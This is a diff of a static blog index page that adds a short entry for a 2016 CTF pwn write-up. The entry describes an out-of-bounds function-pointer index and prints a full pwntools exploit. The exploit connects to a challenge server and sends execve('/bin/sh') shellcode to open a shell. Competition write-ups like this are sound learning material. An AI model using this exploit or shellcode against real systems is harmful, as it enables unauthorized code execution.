@@ -143,7 +143,7 @@
                 
                 <section class="switch-part switch-part2">
                     <div class="widget tagcloud" id="js-tagcloud">
-                        <a href="/tags/ARM/" style="font-size: 10px;">ARM</a> <a href="/tags/AWD/" style="font-size: 10px;">AWD</a> <a href="/tags/Writeup/" style="font-size: 10px;">Writeup</a> <a href="/tags/arm/" style="font-size: 10px;">arm</a> <a href="/tags/awd/" style="font-size: 10px;">awd</a> <a href="/tags/bctf/" style="font-size: 10px;">bctf</a> <a href="/tags/bin/" style="font-size: 12.5px;">bin</a> <a href="/tags/code/" style="font-size: 15px;">code</a> <a href="/tags/ctf/" style="font-size: 10px;">ctf</a> <a href="/tags/cve/" style="font-size: 10px;">cve</a> <a href="/tags/fmt/" style="font-size: 10px;">fmt</a> <a href="/tags/heap/" style="font-size: 10px;">heap</a> <a href="/tags/heap-overflow/" style="font-size: 15px;">heap overflow</a> <a href="/tags/note/" style="font-size: 10px;">note</a> <a href="/tags/office/" style="font-size: 10px;">office</a> <a href="/tags/pwn/" style="font-size: 20px;">pwn</a> <a href="/tags/pwntools/" style="font-size: 10px;">pwntools</a> <a href="/tags/python/" style="font-size: 15px;">python</a> <a href="/tags/wargame/" style="font-size: 10px;">wargame</a> <a href="/tags/web/" style="font-size: 17.5px;">web</a> <a href="/tags/writeup/" style="font-size: 15px;">writeup</a>
+                        <a href="/tags/ARM/" style="font-size: 10px;">ARM</a> <a href="/tags/AWD/" style="font-size: 10px;">AWD</a> <a href="/tags/Writeup/" style="font-size: 10px;">Writeup</a> <a href="/tags/arm/" style="font-size: 10px;">arm</a> <a href="/tags/awd/" style="font-size: 10px;">awd</a> <a href="/tags/bctf/" style="font-size: 10px;">bctf</a> <a href="/tags/bin/" style="font-size: 12.5px;">bin</a> <a href="/tags/code/" style="font-size: 15px;">code</a> <a href="/tags/ctf/" style="font-size: 12.5px;">ctf</a> <a href="/tags/cve/" style="font-size: 10px;">cve</a> <a href="/tags/fmt/" style="font-size: 10px;">fmt</a> <a href="/tags/heap/" style="font-size: 10px;">heap</a> <a href="/tags/heap-overflow/" style="font-size: 15px;">heap overflow</a> <a href="/tags/note/" style="font-size: 10px;">note</a> <a href="/tags/office/" style="font-size: 10px;">office</a> <a href="/tags/pwn/" style="font-size: 20px;">pwn</a> <a href="/tags/pwntools/" style="font-size: 10px;">pwntools</a> <a href="/tags/python/" style="font-size: 15px;">python</a> <a href="/tags/wargame/" style="font-size: 10px;">wargame</a> <a href="/tags/web/" style="font-size: 17.5px;">web</a> <a href="/tags/writeup/" style="font-size: 15px;">writeup</a>
                     </div>
                 </section>
                 
@@ -220,6 +220,71 @@
     </div>
 </nav>
       <div class="body-wrap">
+  
+    <article id="post-ICHUNQIU2016-PWN" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2016/07/05/ICHUNQIU2016-PWN/" class="article-date">
+      <time datetime="2016-07-05T22:28:40.000Z" itemprop="datePublished">2016-07-05</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2016/07/05/ICHUNQIU2016-PWN/">【ICQ2016】 writeup</a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+              <h3 id="pwn1"><a href="#pwn1" class="headerlink" title="pwn1"></a>pwn1</h3><p>func函数数组指针的索引没有规定范围，可以越界。</p>
+<p>exp如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line">context(log_level=<span class="string">"debug"</span>)</div><div class="line"></div><div class="line">addr  =<span class="number">0x0804A030</span></div><div class="line">bbs  = <span class="number">0x0804A0A0</span></div><div class="line">offset  = (bbs - addr)/<span class="number">4</span>+<span class="number">1</span></div><div class="line"><span class="comment"># p  =process('./tc1')</span></div><div class="line">p = remote(<span class="string">'106.75.9.11'</span>,<span class="number">20000</span>)</div><div class="line"><span class="comment"># gdb.attach(p,'b*0x8048641\nc')</span></div><div class="line">shellcode = p32(bbs+<span class="number">4</span>)+ <span class="string">'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'</span></div><div class="line">p.recvuntil(<span class="string">'de\n'</span>)</div><div class="line">p.sendline(str(offset))</div><div class="line">p.recvuntil(<span class="string">' 110]\n'</span>)</div><div class="line">p.sendline(shellcode)</div><div class="line">p.interactive()</div></pre></td></tr></table></figure>
+          
+      
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+
+      
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/">pwn</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/writeup/">writeup</a></li></ul>
+    </div>
+
+      
+        <p class="article-more-link">
+          <a  href="/2016/07/05/ICHUNQIU2016-PWN/#more">阅读全文 >></a>
+        </p>
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
   
     <article id="post-CCF2016" class="article article-type-post" itemscope itemprop="blogPost">
   
